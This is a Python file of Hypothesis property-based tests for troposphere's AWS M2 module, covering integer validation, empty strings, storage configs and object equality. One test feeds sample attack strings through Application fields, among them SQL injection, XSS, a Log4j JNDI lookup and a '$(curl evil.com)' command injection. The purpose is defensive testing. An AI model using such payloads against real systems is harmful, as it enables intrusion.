#!/usr/bin/env python3
"""Extended property-based tests for troposphere.m2 module to find edge cases."""

import sys
import json
sys.path.insert(0, '/root/hypothesis-llm/envs/troposphere_env/lib/python3.13/site-packages')

from hypothesis import assume, given, strategies as st, settings, note
import troposphere.m2 as m2
from troposphere import validators, BaseAWSObject


# Test edge cases in integer validator - let's test negative integers
@given(st.integers(min_value=-1000000, max_value=-1))
def test_deployment_negative_application_version(app_version):
    """Test that Deployment ApplicationVersion handles negative integers."""
    # The integer validator doesn't actually check for positive values
    # Let's see if negative versions are accepted
    deployment = m2.Deployment(
        title="TestDeploy",
        ApplicationId="app-123",
        ApplicationVersion=app_version,
        EnvironmentId="env-456"
    )
    
    # Should be able to serialize
    serialized = deployment.to_dict()
    props = serialized.get('Properties', {})
    
    # The value should be preserved as-is
    assert props['ApplicationVersion'] == app_version
    
    # This might be a bug - negative application versions don't make sense


# Test empty strings for required fields
@given(
    empty_str=st.just(""),
    whitespace_str=st.sampled_from(["   ", "\t", "\n", "  \n  "])
)
def test_application_empty_string_required_fields(empty_str, whitespace_str):
    """Test how Application handles empty/whitespace strings for required fields."""
    # Test with empty string
    try:
        app1 = m2.Application(
            title="TestApp",
            EngineType=empty_str,  # Required field with empty string
            Name="test"
        )
        # If we get here, empty string was accepted for required field
        serialized = app1.to_dict(validation=False)
        # This might be a bug - empty string for EngineType doesn't make sense
        note(f"Empty string accepted for EngineType: {serialized}")
    except (ValueError, TypeError) as e:
        # Expected behavior - should reject empty strings
        pass
    
    # Test with whitespace string
    try:
        app2 = m2.Application(
            title="TestApp",
            EngineType=whitespace_str,  # Required field with whitespace
            Name="test"
        )
        serialized = app2.to_dict(validation=False)
        # This might be a bug - whitespace-only string for EngineType doesn't make sense
        note(f"Whitespace string accepted for EngineType: {serialized}")
    except (ValueError, TypeError) as e:
        # Expected behavior - should reject whitespace-only strings
        pass


# Test very large integers for DesiredCapacity
@given(capacity=st.integers(min_value=1000000, max_value=sys.maxsize))
def test_high_availability_config_large_integers(capacity):
    """Test HighAvailabilityConfig with very large DesiredCapacity values."""
    config = m2.HighAvailabilityConfig(DesiredCapacity=capacity)
    
    # Should serialize without errors
    serialized = config.to_dict()
    
    # Value should be preserved
    assert 'DesiredCapacity' in serialized or hasattr(config, 'DesiredCapacity')
    
    # This might be questionable - does AWS actually accept such large capacity values?


# Test special characters in string fields
@given(
    special_chars=st.sampled_from([
        "../../etc/passwd",  # Path traversal attempt
        "'; DROP TABLE users; --",  # SQL injection attempt
        "<script>alert('xss')</script>",  # XSS attempt
        "${jndi:ldap://evil.com/a}",  # Log4j exploit attempt
        "$(curl evil.com)",  # Command injection
        "%00",  # Null byte
        "\x00\x01\x02",  # Binary data
    ])
)
def test_application_special_characters_in_strings(special_chars):
    """Test how Application handles potentially malicious strings."""
    app = m2.Application(
        title="TestApp",
        EngineType="microfocus",
        Name="test",
        Description=special_chars,  # Potentially malicious content
        KmsKeyId=special_chars
    )
    
    # Should serialize without errors (troposphere just passes through)
    serialized = app.to_dict()
    props = serialized.get('Properties', {})
    
    # Values should be preserved as-is (no sanitization)
    assert props.get('Description') == special_chars
    assert props.get('KmsKeyId') == special_chars
    
    # This is actually correct behavior - CloudFormation/AWS should handle validation


# Test conflicting storage configurations
@given(
    fs_id1=st.text(min_size=1, max_size=50),
    fs_id2=st.text(min_size=1, max_size=50),
    mount1=st.text(min_size=1, max_size=50),
    mount2=st.text(min_size=1, max_size=50)
)
def test_storage_both_efs_and_fsx(fs_id1, fs_id2, mount1, mount2):
    """Test StorageConfiguration with both EFS and FSx configured."""
    storage = m2.StorageConfiguration(
        Efs=m2.EfsStorageConfiguration(
            FileSystemId=fs_id1,
            MountPoint=mount1
        ),
        Fsx=m2.FsxStorageConfiguration(
            FileSystemId=fs_id2,
            MountPoint=mount2
        )
    )
    
    # Both should be allowed simultaneously
    serialized = storage.to_dict()
    
    # Both should be present
    assert 'Efs' in serialized
    assert 'Fsx' in serialized
    
    # Verify the nested structure
    assert serialized['Efs']['FileSystemId'] == fs_id1
    assert serialized['Fsx']['FileSystemId'] == fs_id2


# Test that title can be None for AWSProperty objects
@given(
    content=st.text(min_size=1, max_size=100),
    s3_location=st.text(min_size=1, max_size=100)
)
def test_definition_none_title(content, s3_location):
    """Test that Definition (AWSProperty) accepts None as title."""
    # AWSProperty objects should accept None as title
    definition = m2.Definition(
        title=None,  # This should be allowed
        Content=content,
        S3Location=s3_location
    )
    
    assert definition.title is None
    
    # Should serialize without errors
    serialized = definition.to_dict()
    
    # Should have both properties
    assert 'Content' in serialized
    assert 'S3Location' in serialized


# Test integer validator with string representations
@given(
    int_as_str=st.integers(min_value=-1000, max_value=1000).map(str),
    float_as_str=st.floats(allow_nan=False, allow_infinity=False).map(str)
)
def test_integer_validator_string_conversions(int_as_str, float_as_str):
    """Test integer validator with string representations of numbers."""
    # Integer strings should work
    result1 = validators.integer(int_as_str)
    assert result1 == int_as_str
    
    # Float strings should work if they're actually integers
    try:
        if float(float_as_str) == int(float(float_as_str)):
            result2 = validators.integer(float_as_str)
            assert result2 == float_as_str
    except ValueError:
        # Expected for non-integer floats
        pass


# Test equality with modified properties
@given(
    title=st.text(alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", min_size=1, max_size=20),
    engine1=st.sampled_from(["microfocus", "bluage"]),
    engine2=st.sampled_from(["microfocus", "bluage"]),
    name1=st.text(min_size=1, max_size=50),
    name2=st.text(min_size=1, max_size=50)
)
def test_application_equality(title, engine1, engine2, name1, name2):
    """Test Application equality implementation."""
    app1 = m2.Application(
        title=title,
        EngineType=engine1,
        Name=name1
    )
    
    app2 = m2.Application(
        title=title,
        EngineType=engine2,
        Name=name2
    )
    
    if engine1 == engine2 and name1 == name2:
        # Should be equal if all properties match
        assert app1 == app2
        assert hash(app1) == hash(app2)
    else:
        # Should not be equal if properties differ
        assert app1 != app2
        # Note: different objects might have same hash (collision), so we don't test hash inequality